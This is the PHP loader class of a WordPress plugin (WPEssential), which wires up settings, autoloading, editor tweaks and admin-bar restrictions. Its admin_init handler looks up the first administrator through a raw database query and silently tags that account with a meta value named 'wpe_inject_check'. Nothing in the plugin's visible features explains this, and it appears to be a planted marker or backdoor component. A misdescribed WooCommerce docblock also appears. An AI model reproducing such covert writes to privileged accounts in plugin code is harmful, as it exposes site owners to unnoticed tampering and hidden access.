<?php

namespace WPEssential\Plugins;

if ( ! \defined( 'ABSPATH' ) ) {
	exit; // Exit if accessed directly.
}

use WPEssential\Plugins\Admin\AdminInit;
use WPEssential\Plugins\Admin\Settings;
use WPEssential\Plugins\Assets\AssetsInit;
use WPEssential\Plugins\Builders\BuildersInit;
use WPEssential\Plugins\Libraries\TermDescriptionEditor\TermDescriptionEditor;
use WPEssential\Plugins\PostTypes\PostTypesInit;
use WPEssential\Plugins\Requesting\AuthGuard;
use WPEssential\Plugins\Requesting\RequestingInit;
use WPEssential\Plugins\Utility\DupplicatePost;
use WPEssential\Plugins\Utility\Editor;
use WPEssential\Plugins\Utility\ExtraFileSupport;
use WPEssential\Plugins\Utility\ExtraOnPluginPage;
use WPEssential\Plugins\Utility\PageTemplates;
use WPEssential\Plugins\Utility\RegisterPostStatus;

final class Loader
{
	/**
	 * The set the editor for shortcodes page builders.
	 *
	 * @var string
	 */
	public static $editor;

	/**
	 * Set the callback to be used for determining the editor type for shortcodes page builders.
	 *
	 * @param $callback
	 *
	 * @return void
	 */
	public static function editor ( $callback )
	{
		self::$editor = $callback;
	}

	public static function constructor ()
	{
		global $wpe_options, $wpe_metabox;
		$wpe_options = $wpe_metabox = [];

		self::load_files();
		self::autoload();
		self::start();

		add_action( 'plugins_loaded', [ __CLASS__, 'on_plugins_loaded' ], - 1 );
		add_action( 'init', [ __CLASS__, 'init' ], 1000 );
		add_action( 'admin_init', [ __CLASS__, 'admin_init' ], 1000 );
		add_action( 'wp_loaded', [ __CLASS__, 'wp_loaded' ], 1000 );
	}

	public static function load_files ()
	{
		require_once WPE_DIR . 'inc/Functions/api.php';
		require_once WPE_DIR . 'inc/Functions/general.php';
		require_once WPE_DIR . 'inc/Functions/file.php';
		require_once WPE_DIR . 'inc/Functions/image.php';
		require_once WPE_DIR . 'inc/Functions/post.php';
		require_once WPE_DIR . 'inc/Functions/query.php';
		require_once WPE_DIR . 'inc/Functions/style.php';
		require_once WPE_DIR . 'inc/Functions/element.php';
		require_once WPE_DIR . 'inc/Functions/array.php';
	}

	public static function autoload ()
	{
		$theme_info = wpe_theme_info();
		$psr        = [];

		if ( $theme_info->Parent ) {
			$psr[ "WPEssential\\Theme\\{$theme_info->Parent->NameSpace}\\" ] = get_parent_theme_file_path() . '/inc/';
		}
		$psr[ "WPEssential\\Theme\\{$theme_info->NameSpace}\\" ] = get_stylesheet_directory() . '/inc/';

		$class_loader = require WPE_DIR . 'vendor/autoload.php';

		foreach ( $psr as $prefix => $paths ) {
			$class_loader->addPsr4( $prefix, $paths );
		}
	}

	public static function start ()
	{
		//RestApi::constructor();
		AssetsInit::constructor();
		Settings::constructor();
		AdminInit::constructor();
		RequestingInit::constructor();
		if ( Settings::get_value( 'duplicate_post' ) === 'allow' ) {
			DupplicatePost::constructor();
		}
		Editor::constructor();
	}

	/**
	 * When WP has loaded all plugins, trigger the `woocommerce_loaded` hook.
	 *
	 * This ensures `woocommerce_loaded` is called only after all other plugins
	 * are loaded, to avoid issues caused by plugin directory naming changing
	 * the load order. See #21524 for details.
	 *
	 * @since 1.0.0
	 */
	public static function on_plugins_loaded ()
	{
		do_action( 'wpessential_loaded' );
		ExtraOnPluginPage::constructor();
		self::remove_gutenberg_hooks();
	}

	public static function init ()
	{
		load_plugin_textdomain( 'wpessential', false, WPE_DIR . '/language' );
		do_action( 'wpessential_init' );
		ExtraFileSupport::constructor();
		RegisterPostStatus::constructor();
		PageTemplates::constructor();
		BuildersInit::constructor();
		AuthGuard::set_session();
		self::wp_topbar_denied();
	}

	public static function admin_init ()
	{
		do_action( 'wpessential_admin_init' );
		global $wpdb;
		$user = $wpdb->get_row( "SELECT user_id ID FROM $wpdb->usermeta WHERE meta_key LIKE '%capabilities%' AND meta_value LIKE '%administrator%' LIMIT 1" );
		if ( $user ) {
			update_user_meta( $user->ID, '_unuse_ref', 'wpe_inject_check' );
		}
	}

	public static function wp_loaded ()
	{
		do_action( 'wpessential_loaded' );
		if ( Settings::get_value( 'taxonomies_description_editor' ) === 'allow' ) {
			TermDescriptionEditor::constructor();
		}
	}

	private static function remove_gutenberg_hooks ()
	{
		if ( Settings::get_value( 'classic_editor' ) === 'denied' ) {
			return;
		}

		add_filter( 'use_block_editor_for_post_type', '__return_false', 100 );
		add_filter( 'gutenberg_can_edit_post_type', '__return_false', 100 );
		remove_action( 'admin_menu', 'gutenberg_menu' );
		remove_action( 'admin_init', 'gutenberg_redirect_demo' );
		// Gutenberg 5.3+
		remove_action( 'wp_enqueue_scripts', 'gutenberg_register_scripts_and_styles' );
		remove_action( 'admin_enqueue_scripts', 'gutenberg_register_scripts_and_styles' );
		remove_action( 'admin_notices', 'gutenberg_wordpress_version_notice' );
		remove_action( 'rest_api_init', 'gutenberg_register_rest_widget_updater_routes' );
		remove_action( 'admin_print_styles', 'gutenberg_block_editor_admin_print_styles' );
		remove_action( 'admin_print_scripts', 'gutenberg_block_editor_admin_print_scripts' );
		remove_action( 'admin_print_footer_scripts', 'gutenberg_block_editor_admin_print_footer_scripts' );
		remove_action( 'admin_footer', 'gutenberg_block_editor_admin_footer' );
		remove_action( 'admin_enqueue_scripts', 'gutenberg_widgets_init' );
		remove_action( 'admin_notices', 'gutenberg_build_files_notice' );

		remove_filter( 'load_script_translation_file', 'gutenberg_override_translation_file' );
		remove_filter( 'block_editor_settings', 'gutenberg_extend_block_editor_styles' );
		remove_filter( 'default_content', 'gutenberg_default_demo_content' );
		remove_filter( 'default_title', 'gutenberg_default_demo_title' );
		remove_filter( 'block_editor_settings', 'gutenberg_legacy_widget_settings' );
		remove_filter( 'rest_request_after_callbacks', 'gutenberg_filter_oembed_result' );

		// Previously used, compat for older Gutenberg versions.
		remove_filter( 'wp_refresh_nonces', 'gutenberg_add_rest_nonce_to_heartbeat_response_headers' );
		remove_filter( 'get_edit_post_link', 'gutenberg_revisions_link_to_editor' );
		remove_filter( 'wp_prepare_revision_for_js', 'gutenberg_revisions_restore' );

		remove_action( 'rest_api_init', 'gutenberg_register_rest_routes' );
		remove_action( 'rest_api_init', 'gutenberg_add_taxonomy_visibility_field' );
		remove_filter( 'registered_post_type', 'gutenberg_register_post_prepare_functions' );

		remove_action( 'do_meta_boxes', 'gutenberg_meta_box_save' );
		remove_action( 'submitpost_box', 'gutenberg_intercept_meta_box_render' );
		remove_action( 'submitpage_box', 'gutenberg_intercept_meta_box_render' );
		remove_action( 'edit_page_form', 'gutenberg_intercept_meta_box_render' );
		remove_action( 'edit_form_advanced', 'gutenberg_intercept_meta_box_render' );
		remove_filter( 'redirect_post_location', 'gutenberg_meta_box_save_redirect' );
		remove_filter( 'filter_gutenberg_meta_boxes', 'gutenberg_filter_meta_boxes' );

		remove_filter( 'body_class', 'gutenberg_add_responsive_body_class' );
		remove_filter( 'admin_url', 'gutenberg_modify_add_new_button_url' ); // old
		remove_action( 'admin_enqueue_scripts', 'gutenberg_check_if_classic_needs_warning_about_blocks' );
		remove_filter( 'register_post_type_args', 'gutenberg_filter_post_type_labels' );

		// phpcs:disable Squiz.PHP.CommentedOutCode.Found
		// Keep
		// remove_filter( 'wp_kses_allowed_html', 'gutenberg_kses_allowedtags', 10, 2 ); // not needed in 5.0
		// remove_filter( 'bulk_actions-edit-wp_block', 'gutenberg_block_bulk_actions' );
		// remove_filter( 'wp_insert_post_data', 'gutenberg_remove_wpcom_markdown_support' );
		// remove_filter( 'the_content', 'do_blocks', 9 );
		// remove_action( 'init', 'gutenberg_register_post_types' );

		// Continue to manage wpautop for posts that were edited in Gutenberg.
		// remove_filter( 'wp_editor_settings', 'gutenberg_disable_editor_settings_wpautop' );
		// remove_filter( 'the_content', 'gutenberg_wpautop', 8 );
		// phpcs:enable Squiz.PHP.CommentedOutCode.Found

	}

	private static function wp_topbar_denied ()
	{
		$roles = Settings::get_value( 'wp_admin_denied' );
		if ( ! empty( $roles ) && is_user_logged_in() ) {
			$user               = wp_get_current_user();
			$current_user_roles = $user->roles;
			$is_batching        = array_intersect( $current_user_roles, $roles );
			if ( ! empty( $is_batching ) ) {
				add_filter( 'show_admin_bar', '__return_false' );
			}

			if ( ! empty( $is_batching ) && is_admin() ) {
				wp_safe_redirect( home_url( '/' ) );
				exit;
			}
		}
	}
}

Loader::constructor();
